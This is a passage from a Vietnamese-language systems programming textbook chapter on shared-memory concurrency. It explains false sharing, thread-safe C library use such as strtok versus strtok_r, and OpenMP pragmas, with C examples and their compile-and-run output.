<p>Để biết kích thước <strong>cache line</strong> của L1 cache, dùng lệnh:</p>
<pre><code>$ cat /sys/devices/system/cpu/cpu0/cache/index0/coherency_line_size
64
</code></pre>
<p>Kết quả cho thấy <strong>L1 cache line size</strong> của máy là <strong>64 byte</strong>.<br />
Điều này có nghĩa là mảng <code>counts</code> 40 byte <strong>nằm gọn trong một cache line</strong>.</p>
<p>Hãy nhớ rằng với các <strong>invalidating cache coherence protocol</strong> như MSI, mỗi khi chương trình cập nhật một biến chia sẻ, <strong>toàn bộ cache line</strong> trong các cache khác chứa biến đó sẽ bị <strong>invalidate</strong>.</p>
<p>Xem điều gì xảy ra khi hai thread chạy hàm trên.<br />
Một kịch bản thực thi có thể xảy ra được thể hiện trong <strong>Bảng 2</strong> (giả sử mỗi thread chạy trên một core riêng, và biến <code>x</code> là biến cục bộ của từng thread):</p>
<div class="table-wrapper"><table><thead><tr><th>Time</th><th>Thread 0</th><th>Thread 1</th></tr></thead><tbody>
<tr><td><em>i</em></td><td>Reads array[x] (1)</td><td>...</td></tr>
<tr><td><em>i+1</em></td><td>Increments counts[1]</td><td>Reads array[x] (4)</td></tr>
<tr><td></td><td>(<strong>invalidates cache line</strong>)</td><td></td></tr>
<tr><td><em>i+2</em></td><td>Reads array[x] (6)</td><td>Increments counts[4]</td></tr>
<tr><td></td><td></td><td>(<strong>invalidates cache line</strong>)</td></tr>
<tr><td><em>i+3</em></td><td>Increments counts[6]</td><td>Reads array[x] (2)</td></tr>
<tr><td></td><td>(<strong>invalidates cache line</strong>)</td><td></td></tr>
<tr><td><em>i+4</em></td><td>Reads array[x] (3)</td><td>Increments counts[2]</td></tr>
<tr><td></td><td></td><td>(<strong>invalidates cache line</strong>)</td></tr>
<tr><td><em>i+5</em></td><td>Increments counts[3]</td><td>...</td></tr>
<tr><td></td><td>(<strong>invalidates cache line</strong>)</td><td></td></tr>
</tbody></table>
</div>
<p><strong>Bảng 2.</strong> Một chuỗi thực thi có thể xảy ra của hai thread chạy <code>countElems</code></p>
<ul>
<li>
<p>Ở bước thời gian <em>i</em>, <strong>Thread 0</strong> đọc giá trị tại <code>array[x]</code> trong phần dữ liệu của nó, giá trị này là <code>1</code> trong ví dụ này.</p>
</li>
<li>
<p>Trong các bước thời gian từ <em>i + 1</em> đến <em>i + 5</em>, mỗi thread đọc một giá trị từ <code>array[x]</code>.<br />
Lưu ý rằng mỗi thread đang truy cập các phần tử <strong>khác nhau</strong> của mảng.<br />
Không chỉ vậy, mỗi lần đọc <code>array</code> trong chuỗi thực thi mẫu này đều trả về giá trị <strong>duy nhất</strong> (nên không có <strong>race condition</strong> trong chuỗi thực thi này).<br />
Sau khi đọc giá trị từ <code>array[x]</code>, mỗi thread sẽ tăng giá trị tương ứng trong <code>counts</code>.</p>
</li>
<li>
<p>Hãy nhớ rằng mảng <code>counts</code> <strong>nằm gọn trong một cache line</strong> của L1 cache.<br />
Do đó, <strong>mỗi lần ghi</strong> vào <code>counts</code> sẽ <strong>invalidate</strong> (vô hiệu hóa) <strong>toàn bộ cache line</strong> này trong <strong>mọi L1 cache khác</strong>.</p>
</li>
<li>
<p>Kết quả là, mặc dù đang cập nhật <strong>các vị trí bộ nhớ khác nhau</strong> trong <code>counts</code>, nhưng bất kỳ cache line nào chứa <code>counts</code> cũng sẽ bị <strong>invalidate</strong> với <strong>mỗi lần cập nhật</strong> <code>counts</code>!</p>
</li>
</ul>
<p>Việc invalidation buộc tất cả các L1 cache phải cập nhật lại cache line này bằng một phiên bản “hợp lệ” từ L2.<br />
Việc lặp đi lặp lại quá trình invalidation và ghi đè cache line từ L1 cache là một ví dụ về <strong>thrashing</strong> — khi các xung đột lặp lại trong cache gây ra hàng loạt <strong>cache miss</strong>.</p>
<p>Khi số lượng core tăng, vấn đề càng trở nên nghiêm trọng, vì lúc này có nhiều L1 cache hơn cùng thực hiện invalidation trên cache line.<br />
Kết quả là, việc thêm thread mới sẽ làm <strong>thời gian chạy chậm lại</strong>, mặc dù mỗi thread đang truy cập các phần tử <strong>khác nhau</strong> của mảng <code>counts</code>!</p>
<p>Đây là một ví dụ về <strong>false sharing</strong> — hiện tượng “ảo giác” rằng các phần tử riêng lẻ đang được nhiều core chia sẻ.<br />
Trong ví dụ trước, có vẻ như tất cả các core đang truy cập cùng một phần tử của <code>counts</code>, mặc dù thực tế không phải vậy.</p>
<h3 id="1453-khắc-phục-false-sharing"><a class="header" href="#1453-khắc-phục-false-sharing">14.5.3. Khắc phục False Sharing</a></h3>
<p>Một cách để khắc phục false sharing là <strong>padding</strong> (đệm) mảng (trong trường hợp này là <code>counts</code>) bằng các phần tử bổ sung để nó <strong>không vừa</strong> trong một cache line.<br />
Tuy nhiên, padding có thể gây <strong>lãng phí bộ nhớ</strong> và có thể <strong>không loại bỏ hoàn toàn vấn đề</strong> trên mọi kiến trúc (ví dụ: hai máy khác nhau có kích thước L1 cache khác nhau).<br />
Trong hầu hết các trường hợp, việc viết code để hỗ trợ nhiều kích thước cache thường <strong>không đáng</strong> so với lợi ích hiệu năng thu được.</p>
<p>Một giải pháp tốt hơn là để các thread ghi vào <strong>local storage</strong> (bộ nhớ cục bộ) bất cứ khi nào có thể.<br />
Trong ngữ cảnh này, local storage là vùng nhớ <strong>cục bộ</strong> cho một thread.<br />
Giải pháp sau đây giảm false sharing bằng cách thực hiện cập nhật vào một biến <code>counts</code> cục bộ được khai báo riêng, gọi là <code>local_counts</code>.</p>
<p>Hãy xem lại phiên bản cuối cùng của hàm <code>countElems</code> (trích từ <a href="C14-SharedMemory/_attachments/countElems_p_v3.c">countElems_p_v3.c</a>):</p>
<pre><code class="language-c">/*parallel version of CountSort algorithm step 1 (final attempt with mutexes):
 * extracts arguments from args value
 * calculates the portion of the array this thread is responsible for counting
 * computes the frequency of all the elements in assigned component and stores
 * the associated counts of each element in counts array
*/
void *countElems( void *args ){
    //extract arguments
    //omitted for brevity
    int *array = myargs-&gt;ap;
    long *counts = myargs-&gt;countp;

    long local_counts[MAX] = {0}; //local declaration of counts array

    //assign work to the thread
    //compute chunk, start, and end values (omitted for brevity)

    long i;

    //heart of the program
    for (i = start; i &lt; end; i++){
        val = array[i];
        local_counts[val] = local_counts[val] + 1; //update local counts array
    }

    //update to global counts array
    pthread_mutex_lock(&amp;mutex); //acquire the mutex lock
    for (i = 0; i &lt; MAX; i++){
        counts[i] += local_counts[i];
    }
    pthread_mutex_unlock(&amp;mutex); //release the mutex lock

    return NULL;
}
</code></pre>
<p>Việc sử dụng <code>local_counts</code> để cộng dồn tần suất thay vì <code>counts</code> là nguyên nhân chính giúp giảm false sharing trong ví dụ này:</p>
<pre><code class="language-c">for (i = start; i &lt; end; i++){
    val = array[i];
    local_counts[val] = local_counts[val] + 1; // cập nhật mảng đếm cục bộ
}
</code></pre>
<p>Vì <strong>cache coherence</strong> được thiết kế để duy trì góc nhìn nhất quán về bộ nhớ chia sẻ, nên invalidation chỉ xảy ra khi <strong>ghi</strong> vào <strong>giá trị chia sẻ</strong> trong bộ nhớ.<br />
Do <code>local_counts</code> <strong>không được chia sẻ</strong> giữa các thread, việc ghi vào nó sẽ <strong>không</strong> làm invalidate cache line tương ứng.</p>
<p>Trong phần cuối của code, <strong>mutex</strong> đảm bảo tính đúng đắn bằng cách chỉ cho phép <strong>một thread</strong> cập nhật mảng <code>counts</code> chia sẻ tại một thời điểm:</p>
<pre><code class="language-c">// cập nhật mảng counts toàn cục
pthread_mutex_lock(&amp;mutex); // khóa mutex
for (i = 0; i &lt; MAX; i++){
    counts[i] += local_counts[i];
}
pthread_mutex_unlock(&amp;mutex); // mở khóa mutex
</code></pre>
<p>Vì <code>counts</code> nằm trên <strong>một cache line duy nhất</strong>, nó vẫn sẽ bị invalidate với mỗi lần ghi.<br />
Điểm khác biệt là chi phí ở đây <strong>tối đa</strong> là <code>MAX × t</code> lần ghi so với <code>n</code> lần ghi,<br />
trong đó <code>n</code> là độ dài mảng đầu vào và <code>t</code> là số lượng thread được sử dụng.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="146-thread-safety-an-toàn-luồng"><a class="header" href="#146-thread-safety-an-toàn-luồng">14.6. Thread Safety (An toàn luồng)</a></h2>
<p>Cho đến nay, chúng ta đã tìm hiểu các cấu trúc đồng bộ hóa mà lập trình viên có thể sử dụng để đảm bảo chương trình đa luồng của mình hoạt động <strong>nhất quán</strong> và <strong>đúng đắn</strong> bất kể số lượng thread được dùng.<br />
Tuy nhiên, <strong>không phải lúc nào</strong> cũng an toàn khi giả định rằng các hàm trong thư viện C chuẩn có thể được dùng “nguyên trạng” trong mọi ứng dụng đa luồng.<br />
Không phải tất cả các hàm trong thư viện C đều <strong>thread safe</strong> (an toàn luồng) — tức là có thể được nhiều thread chạy đồng thời mà vẫn đảm bảo kết quả đúng và không gây ra tác dụng phụ ngoài ý muốn.</p>
<p>Để đảm bảo các chương trình <em>chúng ta</em> viết là thread safe, điều quan trọng là phải sử dụng <a href="C14-SharedMemory/synchronization.html#_synchronizing_threads">synchronization primitives</a> như <strong>mutex</strong> và <strong>barrier</strong> để buộc chương trình đa luồng duy trì tính nhất quán và đúng đắn, bất kể số lượng thread thay đổi ra sao.</p>
<p>Một khái niệm liên quan chặt chẽ đến thread safety là <strong>re-entrancy</strong> (tái nhập).<br />
Tất cả code thread safe đều là re-entrant; tuy nhiên, <strong>không phải</strong> tất cả code re-entrant đều thread safe.<br />
Một hàm được gọi là <strong>re-entrant</strong> nếu nó có thể được thực thi lại hoặc thực thi một phần bởi chính nó mà không gây ra vấn đề.<br />
Theo định nghĩa, code re-entrant đảm bảo rằng mọi truy cập vào trạng thái toàn cục (global state) của chương trình đều giữ cho trạng thái đó nhất quán.<br />
Mặc dù re-entrancy thường (một cách sai lầm) được dùng như từ đồng nghĩa với thread safety, vẫn có những trường hợp đặc biệt mà code re-entrant <strong>không</strong> thread safe.</p>
<p>Khi viết code đa luồng, hãy xác minh rằng các hàm thư viện C bạn sử dụng thực sự là thread safe.<br />
May mắn thay, danh sách các hàm <strong>không</strong> thread safe trong thư viện C khá nhỏ.<br />
<strong>The Open Group</strong> duy trì <a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/xsh_chap02_09.html">danh sách các hàm không thread safe</a>.</p>
<h3 id="1461-khắc-phục-các-vấn-đề-về-thread-safety"><a class="header" href="#1461-khắc-phục-các-vấn-đề-về-thread-safety">14.6.1. Khắc phục các vấn đề về Thread Safety</a></h3>
<p><a href="C14-SharedMemory/synchronization.html#_synchronizing_threads">Synchronization primitives</a> là cách phổ biến nhất để khắc phục các vấn đề liên quan đến thread safety.<br />
Tuy nhiên, việc vô tình sử dụng các hàm thư viện C <strong>không</strong> thread safe có thể gây ra những lỗi tinh vi, khó phát hiện.</p>
<p>Hãy xem một phiên bản được chỉnh sửa nhẹ của hàm <code>countsElem</code> có tên <code>countElemsStr</code>, với mục tiêu đếm tần suất xuất hiện của các chữ số trong một chuỗi, trong đó mỗi chữ số được phân tách bằng dấu cách.<br />
Chương trình dưới đây đã được rút gọn; mã nguồn đầy đủ có tại: <a href="C14-SharedMemory/_attachments/countElemsStr.c">countElemsStr.c</a>.</p>
<pre><code class="language-c">/* computes the frequency of all the elements in the input string and stores
 * the associated counts of each element in the array called counts. */
void countElemsStr(int *counts, char *input_str) {
    int val, i;
    char *token;
    token = strtok(input_str, &quot; &quot;);
    while (token != NULL) {
        val = atoi(token);
        counts[val] = counts[val] + 1;
        token = strtok(NULL, &quot; &quot;);
    }
}

/* main function:
 * calls countElemsStr on a static string and counts up all the digits in
 * that string. */
int main( int argc, char **argv ) {
    //lines omitted for brevity, but gets user defined length of string

    //fill string with n digits
    char *inputString = calloc(length * 2, sizeof(char));
    fillString(inputString, length * 2);

    countElemsStr(counts, inputString);

    return 0;
}
</code></pre>
<p>Hàm <code>countElemsStr</code> sử dụng hàm <code>strtok</code> (đã được phân tích trong <a href="C14-SharedMemory/../C2-C_depth/strings.html#_strtok_strtok_r">phần thảo luận về strings</a>) để tách từng chữ số (lưu trong <code>token</code>) từ chuỗi, sau đó chuyển đổi sang số nguyên và cập nhật vào mảng <code>counts</code>.</p>
<p>Biên dịch và chạy chương trình này với 100.000 phần tử cho ra kết quả:</p>
<pre><code>$ gcc -o countElemsStr countElemsStr.c

$ ./countElemsStr 100000 1
contents of counts array:
9963 9975 9953 10121 10058 10017 10053 9905 9915 10040

</code></pre>
<p>Bây giờ, hãy xem phiên bản đa luồng của <code>countElemsStr</code> (mã nguồn đầy đủ xem <a href="C14-SharedMemory/_attachments/countElemsStr_p.c">tại đây</a>):</p>
<pre><code class="language-c">/* parallel version of countElemsStr (First cut):
 * computes the frequency of all the elements in the input string and stores
 * the associated counts of each element in the array called counts
*/
void *countElemsStr(void *args) {
    //parse args
    struct t_arg *myargs = (struct t_arg *)args;
    //omitted for brevity

    //local variables
    int val, i;
    char *token;
    int local_counts[MAX] = {0};

    //compute local start and end values and chunk size:
    //omitted for brevity

    //tokenize values
    token = strtok(input_str + start, &quot; &quot;);
    while (token != NULL) {
        val = atoi(token); //convert to an int
        local_counts[val] = local_counts[val] + 1; //update associated counts
        token = strtok(NULL, &quot; &quot;);
    }

    pthread_mutex_lock(&amp;mutex);
    for (i = 0; i &lt; MAX; i++) {
        counts[i] += local_counts[i];
    }
    pthread_mutex_unlock(&amp;mutex);

    return NULL;
}
</code></pre>
<p>Trong phiên bản này, mỗi thread xử lý một phần riêng của chuỗi <code>input_str</code>.<br />
Mảng <code>local_counts</code> đảm bảo phần lớn các thao tác ghi diễn ra trên bộ nhớ cục bộ.<br />
Một <strong>mutex</strong> được sử dụng để đảm bảo không có hai thread nào ghi vào biến chia sẻ <code>counts</code> cùng lúc.</p>
<p>Tuy nhiên, biên dịch và chạy chương trình này cho ra kết quả:</p>
<pre><code>
$ gcc -o countElemsStr_p countElemsStr_p.c -pthread

$ ./countElemsStr_p 100000 1 1
contents of counts array:
9963 9975 9953 10121 10058 10017 10053 9905 9915 10040

$ ./countElemsStr_p 100000 1 2
contents of counts array:
498 459 456 450 456 471 446 462 450 463

$ ./countElemsStr_p 100000 1 4
contents of counts array:
5038 4988 4985 5042 5056 5013 5025 5035 4968 5065

</code></pre>
<p>Mặc dù đã dùng mutex để khóa khi truy cập mảng <code>counts</code>, kết quả giữa các lần chạy lại <strong>khác nhau hoàn toàn</strong>.<br />
Nguyên nhân là vì hàm <code>countsElemsStr</code> <strong>không</strong> thread safe, do hàm thư viện xử lý chuỗi <code>strtok</code> <strong>không</strong> thread safe!<br />
Truy cập trang <a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/xsh_chap02_09.html">OpenGroup</a> xác nhận rằng <code>strtok</code> nằm trong danh sách các hàm không thread safe.</p>
<p>Để khắc phục, chỉ cần thay <code>strtok</code> bằng phiên bản thread safe của nó là <code>strtok_r</code>.<br />
Trong <code>strtok_r</code>, một con trỏ được truyền làm tham số cuối để giúp thread theo dõi vị trí hiện tại trong chuỗi khi phân tách.<br />
Dưới đây là hàm đã sửa với <code>strtok_r</code> (mã nguồn đầy đủ tại <a href="C14-SharedMemory/_attachments/countElemsStr_p_v2.c">countsElemsStr_p_v2.c</a>):</p>
<pre><code class="language-c">/* parallel version of countElemsStr (First cut):
 * computes the frequency of all the elements in the input string and stores
 * the associated counts of each element in the array called counts */
void* countElemsStr(void* args) {
    //parse arguments
    //omitted for brevity

    //local variables
    int val, i;
    char * token;
    int local_counts[MAX] = {0};
    char * saveptr; //for saving state of strtok_r

    //compute local start and end values and chunk size:
    //omitted for brevity

    //tokenize values
    token = strtok_r(input_str+start, &quot; &quot;, &amp;saveptr);
    while (token != NULL) {
        val = atoi(token); //convert to an int
        local_counts[val] = local_counts[val]+1; //update associated counts
        token = strtok_r(NULL, &quot; &quot;, &amp;saveptr);
    }

    pthread_mutex_lock(&amp;mutex);
    for (i = 0; i &lt; MAX; i++) {
        counts[i]+=local_counts[i];
    }
    pthread_mutex_unlock(&amp;mutex);

    return NULL;
}
</code></pre>
<p>Thay đổi duy nhất trong phiên bản này là khai báo thêm con trỏ ký tự <code>saveptr</code> và thay tất cả các lần gọi <code>strtok</code> bằng <code>strtok_r</code>.<br />
Chạy lại chương trình sau khi thay đổi cho ra kết quả:</p>
<pre><code>$ gcc -o countElemsStr_p_v2 countElemsStr_p_v2.c -pthread

$ ./countElemsStr_p_v2 100000 1 1
contents of counts array:
9963 9975 9953 10121 10058 10017 10053 9905 9915 10040

$ ./countElemsStr_p_v2 100000 1 2
contents of counts array:
9963 9975 9953 10121 10058 10017 10053 9905 9915 10040

$ ./countElemsStr_p_v2 100000 1 4
contents of counts array:
9963 9975 9953 10121 10058 10017 10053 9905 9915 10040


</code></pre>
<p>Giờ đây, chương trình cho ra <strong>kết quả giống nhau ở mọi lần chạy</strong>.<br />
Việc sử dụng <code>saveptr</code> kết hợp với <code>strtok_r</code> đảm bảo mỗi thread có thể <strong>độc lập</strong> theo dõi vị trí của mình khi phân tách chuỗi.</p>
<p><strong>Kết luận</strong>: Khi viết ứng dụng đa luồng, luôn kiểm tra <a href="http://pubs.opengroup.org/onlinepubs/009695399/functions/xsh_chap02_09.html">danh sách các hàm C không thread safe</a>.<br />
Điều này có thể giúp lập trình viên tránh được nhiều rắc rối và tiết kiệm thời gian khi viết và gỡ lỗi chương trình đa luồng.</p>
<hr />
<div style="break-before: page; page-break-before: always;"></div><h2 id="147-Đa-luồng-ngầm-định-với-openmp-implicit-threading-with-openmp"><a class="header" href="#147-Đa-luồng-ngầm-định-với-openmp-implicit-threading-with-openmp">14.7. Đa luồng ngầm định với OpenMP (Implicit Threading with OpenMP)</a></h2>
<p>Cho đến nay, chúng ta đã trình bày lập trình bộ nhớ chia sẻ bằng <strong>POSIX threads</strong> (Pthreads).<br />
Mặc dù Pthreads rất hữu ích cho các ứng dụng đơn giản, nhưng khi chương trình trở nên phức tạp hơn, chúng lại ngày càng khó sử dụng.<br />
Pthreads là một ví dụ của <strong>explicit parallel programming</strong> (lập trình song song tường minh) với threads, yêu cầu lập trình viên phải chỉ rõ <strong>chính xác</strong> mỗi thread cần làm gì và khi nào thread đó bắt đầu hoặc kết thúc.</p>
<p>Với Pthreads, việc <em>bổ sung dần</em> (incrementally) khả năng song song vào một chương trình tuần tự hiện có cũng là một thách thức.<br />
Nói cách khác, ta thường phải viết lại toàn bộ chương trình để sử dụng threads — điều này thường không mong muốn khi cần song song hóa một codebase lớn và đã tồn tại từ trước.</p>
<p>Thư viện <strong>Open Multiprocessing</strong> (<strong>OpenMP</strong>) cung cấp một giải pháp <em>ngầm định</em> thay thế cho Pthreads.<br />
OpenMP được tích hợp sẵn trong GCC và các trình biên dịch phổ biến khác như LLVM và Clang, và có thể dùng với các ngôn ngữ C, C++ và Fortran.<br />
Ưu điểm chính của OpenMP là cho phép lập trình viên song song hóa các thành phần của code C tuần tự hiện có bằng cách thêm <strong>pragma</strong> (chỉ thị đặc biệt cho trình biên dịch) vào các phần của code.<br />
Các pragma dành riêng cho OpenMP bắt đầu bằng <code>#pragma omp</code>.</p>
<p>Việc trình bày chi tiết OpenMP nằm ngoài phạm vi của cuốn sách này, nhưng chúng ta sẽ đề cập đến một số pragma thường gặp và minh họa cách sử dụng chúng trong bối cảnh một số ứng dụng ví dụ.</p>
<h3 id="1471-các-pragma-thường-dùng-common-pragmas"><a class="header" href="#1471-các-pragma-thường-dùng-common-pragmas">14.7.1. Các pragma thường dùng (Common Pragmas)</a></h3>
<p>Dưới đây là một số pragma được sử dụng phổ biến trong các chương trình OpenMP:</p>
<p><code>#pragma omp parallel</code></p>
<p>:   Tạo một <strong>team</strong> (nhóm) các thread và cho mỗi thread chạy đoạn code trong phạm vi của pragma (thường là một lời gọi hàm).<br />
Việc gọi pragma này thường tương đương với việc gọi cặp hàm <code>pthread_create</code> và <code>pthread_join</code> <a href="C14-SharedMemory/posix.html#_creating_and_joining_threads">đã thảo luận trong phần Pthreads</a>.<br />
Pragma này có thể đi kèm một số <strong>clause</strong> (mệnh đề), bao gồm:</p>
<pre><code>- `num_threads`: chỉ định số lượng thread cần tạo.
- `private`: danh sách các biến sẽ là **private** (cục bộ) cho từng thread. Các biến private cũng có thể được khai báo trong phạm vi của pragma. Mỗi thread sẽ có bản sao riêng của từng biến.
- `shared`: danh sách các biến sẽ được **shared** (chia sẻ) giữa các thread. Chỉ có **một bản sao** của biến được chia sẻ giữa tất cả các thread.
- `default`: chỉ định việc xác định biến nào là shared sẽ do trình biên dịch quyết định hay không. Trong hầu hết các trường hợp, ta nên dùng `default(none)` và chỉ rõ biến nào là shared, biến nào là private.
</code></pre>
<p><code>#pragma omp for</code></p>
<p>:   Chỉ định rằng mỗi thread sẽ thực thi một <strong>tập con</strong> các vòng lặp của một vòng <code>for</code>.<br />
Mặc dù việc lập lịch (scheduling) vòng lặp phụ thuộc vào hệ thống, mặc định thường là phương pháp <strong>chunking</strong> (chia khối) đã đề cập trong <a href="C14-SharedMemory/posix.html#_revisiting_scalar_multiplication">ví dụ nhân vô hướng</a>.<br />
Đây là dạng lập lịch <strong>static</strong>: mỗi thread được gán một khối cố định và xử lý các vòng lặp trong khối đó.</p>
<pre><code>OpenMP cũng hỗ trợ lập lịch **dynamic**: mỗi thread nhận một số vòng lặp, và khi hoàn thành sẽ yêu cầu một nhóm vòng lặp mới.  
Chính sách lập lịch có thể được đặt bằng clause:

- `schedule(dynamic)`: chỉ định sử dụng lập lịch **dynamic**. Mặc dù hữu ích trong một số trường hợp, lập lịch static (mặc định) thường nhanh hơn.
</code></pre>
<p><code>#pragma omp parallel for</code></p>
<p>:   Kết hợp giữa <code>omp parallel</code> và <code>omp for</code>.<br />
Khác với <code>omp for</code>, pragma này <strong>tạo team thread</strong> trước, rồi mới gán cho mỗi thread một tập vòng lặp để thực thi.</p>
<p><code>#pragma omp critical</code></p>
<p>:   Chỉ định rằng đoạn code trong phạm vi của pragma là một <strong>critical section</strong> — chỉ một thread được thực thi đoạn code này tại một thời điểm để đảm bảo tính đúng đắn.</p>
<p>Ngoài ra, OpenMP còn cung cấp một số <strong>hàm</strong> hữu ích cho thread khi thực thi, ví dụ:</p>
<ul>
<li><code>omp_get_num_threads</code>: trả về số lượng thread trong team hiện tại.</li>
<li><code>omp_set_num_threads</code>: đặt số lượng thread mà một team sẽ có.</li>
<li><code>omp_get_thread_num</code>: trả về <strong>ID</strong> của thread đang gọi hàm.</li>
</ul>
<blockquote>
<p><strong>Lưu ý:</strong><br />
<code>omp parallel for</code> <strong>chỉ hoạt động với vòng lặp <code>for</code></strong>.<br />
Các loại vòng lặp khác như <code>while</code> hoặc <code>do</code>-<code>while</code> <strong>không được hỗ trợ</strong>.</p>
</blockquote>
<h3 id="1472-hello-threading-phiên-bản-openmp"><a class="header" href="#1472-hello-threading-phiên-bản-openmp">14.7.2. Hello Threading: Phiên bản OpenMP</a></h3>
<p>Hãy cùng xem lại chương trình “Hello World”<br />
(<a href="C14-SharedMemory/_attachments/hellothreads.c">hellothreads.c</a>), nhưng lần này sử dụng <strong>OpenMP</strong> thay vì <strong>Pthreads</strong>:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;omp.h&gt;

void HelloWorld( void ) {
    long myid = omp_get_thread_num();
    printf( &quot;Hello world! I am thread %ld\n&quot;, myid );
}

int main( int argc, char** argv ) {
    long nthreads;

    if (argc !=2) {
        fprintf(stderr, &quot;usage: %s &lt;n&gt;\n&quot;, argv[0]);
        fprintf(stderr, &quot;where &lt;n&gt; is the number of threads\n&quot;);
        return 1;
    }

    nthreads = strtol( argv[1], NULL, 10 );

    #pragma omp parallel num_threads(nthreads)
        HelloWorld();

    return 0;
}
</code></pre>
<p>Lưu ý rằng chương trình OpenMP <strong>ngắn hơn rất nhiều</strong> so với phiên bản Pthreads.<br />
Để truy cập các hàm thư viện OpenMP, ta include file header <code>omp.h</code>.<br />
Pragma <code>omp parallel num_threads(nthreads)</code> trong hàm <code>main</code> sẽ tạo ra một nhóm thread, trong đó mỗi thread sẽ gọi hàm <code>HelloWorld</code>.</p>
<p>Mệnh đề <code>num_threads(nthreads)</code> chỉ định tổng số thread sẽ được tạo.<br />
Pragma này cũng sẽ <strong>join</strong> (hợp nhất) tất cả các thread đã tạo về lại tiến trình đơn luồng.<br />
Nói cách khác, toàn bộ công việc cấp thấp như tạo và join thread được <strong>trừu tượng hóa</strong> khỏi lập trình viên và chỉ cần một pragma duy nhất để thực hiện.<br />
Vì lý do này, OpenMP được xem là một thư viện <strong>implicit threading</strong> (đa luồng ngầm định).</p>
<p>OpenMP cũng trừu tượng hóa việc quản lý <strong>thread ID</strong>.<br />
Trong ngữ cảnh của <code>HelloWorld</code>, hàm <code>omp_get_thread_num</code> sẽ lấy ra <strong>ID duy nhất</strong> gắn với thread đang chạy nó.</p>
<h4 id="biên-dịch-mã-nguồn"><a class="header" href="#biên-dịch-mã-nguồn">Biên dịch mã nguồn</a></h4>
<p>Hãy biên dịch và chạy chương trình này bằng cách truyền cờ <code>-fopenmp</code> cho trình biên dịch, báo hiệu rằng chúng ta đang biên dịch với OpenMP:</p>
<pre><code>$ gcc -o hello_mp hello_mp.c -fopenmp

$ ./hello_mp 4
Hello world! I am thread 2
Hello world! I am thread 3
Hello world! I am thread 0
Hello world! I am thread 1
</code></pre>
<p>Vì thứ tự thực thi của các thread có thể thay đổi ở những lần chạy sau, chạy lại chương trình này sẽ cho ra một chuỗi thông báo khác:</p>
<pre><code>$ ./hello_mp 4
Hello world! I am thread 3
Hello world! I am thread 2
Hello world! I am thread 1
Hello world! I am thread 0
</code></pre>
<p>Hành vi này giống với <a href="C14-SharedMemory/posix.html#_hello_threading_writing_your_first_multithreaded_program">ví dụ dùng Pthreads</a> mà chúng ta đã thấy trước đó.</p>
<h3 id="1473-ví-dụ-phức-tạp-hơn-countsort-với-openmp"><a class="header" href="#1473-ví-dụ-phức-tạp-hơn-countsort-với-openmp">14.7.3. Ví dụ phức tạp hơn: CountSort với OpenMP</a></h3>
<p>Một ưu điểm mạnh mẽ của OpenMP là nó cho phép lập trình viên <strong>song song hóa dần dần</strong> (incrementally parallelize) mã nguồn của mình.<br />
Để thấy điều này trong thực tế, hãy song song hóa thuật toán <strong>CountSort</strong> phức tạp hơn mà chúng ta đã thảo luận trước đó trong chương này (code tuần tự nằm tại: <a href="C14-SharedMemory/_attachments/countSort.c">countSort.c</a>).</p>
<p>Hãy nhớ rằng thuật toán này sắp xếp các mảng chứa một phạm vi giá trị nhỏ.<br />
Hàm <code>main</code> của chương trình tuần tự trông như sau:</p>
<pre><code class="language-c">int main( int argc, char **argv ) {
    //parse args (omitted for brevity)

    srand(10); //use of static seed ensures the output is the same every run

    //generate random array of elements of specified length
    //(omitted for brevity)

    //allocate counts array and initializes all elements to zero.
    int counts[MAX] = {0};

    countElems(counts, array, length); //calls step 1
    writeArray(counts, array); //calls step2

    free(array); //free memory

    return 0;
}
</code></pre>
<p>Hàm <code>main</code>, sau khi phân tích các tham số dòng lệnh và tạo một mảng ngẫu nhiên, sẽ gọi hàm <code>countsElems</code> rồi đến hàm <code>writeArray</code>.</p>
<h4 id="song-song-hóa-countelems-bằng-openmp"><a class="header" href="#song-song-hóa-countelems-bằng-openmp">Song song hóa CountElems bằng OpenMP</a></h4>
<p>Có nhiều cách để song song hóa chương trình trên.<br />
Một cách (được minh họa trong ví dụ sau) là sử dụng <strong>pragma</strong> <code>omp parallel</code> trong ngữ cảnh của các hàm <code>countElems</code> và <code>writeArray</code>.<br />
Kết quả là <strong>không cần</strong> thay đổi gì trong hàm <code>main</code>.<br />
Phiên bản đầy đủ của chương trình có tại: <a href="C14-SharedMemory/_attachments/countSort_mp.c">countSort_mp.c</a>.</p>
<p>Trước tiên, hãy xem cách song song hóa hàm <code>countElems</code> bằng OpenMP:</p>
<pre><code class="language-c">void countElems(int *counts, int *array, long length) {

    #pragma omp parallel default(none) shared(counts, array, length)
    {
        int val, i, local[MAX] = {0};
        #pragma omp for
        for (i = 0; i &lt; length; i++) {
            val = array[i];
            local[val]++;
        }

       #pragma omp critical
       {
           for (i = 0; i &lt; MAX; i++) {
               counts[i] += local[i];
           }
       }
   }
}
</code></pre>
<p>Trong phiên bản này của code, ba pragma được sử dụng:</p>
<ul>
<li>
<p><strong><code>#pragma omp parallel</code></strong>: chỉ định rằng một <strong>team</strong> (nhóm) các thread sẽ được tạo.<br />
Lệnh <code>omp_set_num_threads(nthreads)</code> trong <code>main</code> đặt kích thước mặc định của team thread là <code>nthreads</code>.<br />
Nếu không dùng hàm <code>omp_set_num_threads</code>, số lượng thread sẽ mặc định bằng số lượng core trong hệ thống.<br />
Nhắc lại: pragma <code>omp parallel</code> sẽ <strong>ngầm định</strong> tạo thread ở đầu khối và <strong>join</strong> chúng ở cuối khối.<br />
Dấu ngoặc nhọn <code>{}</code> được dùng để xác định phạm vi.<br />
Mệnh đề <code>shared</code> khai báo rằng các biến <code>counts</code>, <code>array</code> và <code>length</code> là <strong>shared</strong> (toàn cục) giữa tất cả các thread.<br />
Do đó, các biến <code>val</code>, <code>i</code> và <code>local[MAX]</code> sẽ được khai báo <strong>cục bộ</strong> trong từng thread.</p>
</li>
<li>
<p><strong><code>#pragma omp for</code></strong>: song song hóa vòng lặp <code>for</code>, chia số vòng lặp cho các thread.<br />
OpenMP sẽ tính toán cách chia vòng lặp tối ưu.<br />
Như đã đề cập trước đó, chiến lược mặc định thường là phương pháp <strong>chunking</strong>, trong đó mỗi thread nhận xấp xỉ cùng số vòng lặp để xử lý.<br />
Như vậy, mỗi thread sẽ đọc một phần của mảng <code>array</code> chia sẻ và cộng dồn kết quả vào mảng <code>local</code> cục bộ của nó.</p>
</li>
<li>
